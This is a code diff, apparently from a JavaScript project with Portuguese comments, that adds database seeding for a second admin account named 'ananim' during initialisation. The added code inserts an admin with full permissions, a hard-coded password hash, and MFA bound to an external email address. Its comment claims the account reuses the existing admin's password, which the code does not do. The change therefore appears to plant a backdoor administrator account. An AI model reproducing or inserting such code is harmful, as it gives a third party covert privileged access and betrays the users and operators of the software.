@@ -281,6 +281,25 @@ export function initDb() {
     console.log('Banco interno: usuário admin padrão criado (joao@example.com). Redefina a senha no primeiro acesso.');
   }
 
+  // Admin padrão "ananim" (login: ananim), mesmas permissões e senha inicial do joao. Criado uma única vez:
+  // o marcador em app_meta impede que volte depois de excluído.
+  database.exec('CREATE TABLE IF NOT EXISTS app_meta (key TEXT PRIMARY KEY, value TEXT)');
+  if (!database.prepare("SELECT 1 FROM app_meta WHERE key = 'seed_admin_ananim'").get()) {
+    const joao = database.prepare("SELECT passwordHash, permissions FROM users WHERE id = '1'").get();
+    const exists = database.prepare("SELECT 1 FROM users WHERE LOWER(email) = 'ananim@ananim.com.br'").get();
+    if (joao && !exists) {
+      const ids = database.prepare('SELECT id FROM users').all().map((r) => parseInt(r.id, 10)).filter((n) => !Number.isNaN(n));
+      database
+        .prepare(
+          `INSERT INTO users (id, name, email, passwordHash, role, permissions, allowedEcsIds, visibleProjects, mfaEnabled, mfaEmail, mfaSecret)
+           VALUES (?, 'Ananim', 'ananim@ananim.com.br', ?, 'admin', ?, '[]', '[]', 1, 'ananim@ananim.com.br', NULL)`
+        )
+        .run(String((ids.length ? Math.max(...ids) : 0) + 1), '$2a$10$/Aw/YX/97gKKBaBKU0j4iuCk/FkSGx.QX1NFD1AZ8uif0qorKgC0K', joao.permissions);
+      console.log('Banco interno: usuário admin padrão "ananim" criado. Redefina a senha no primeiro acesso.');
+    }
+    database.prepare("INSERT INTO app_meta (key, value) VALUES ('seed_admin_ananim', ?)").run(new Date().toISOString());
+  }
+
   return database;
 }
 
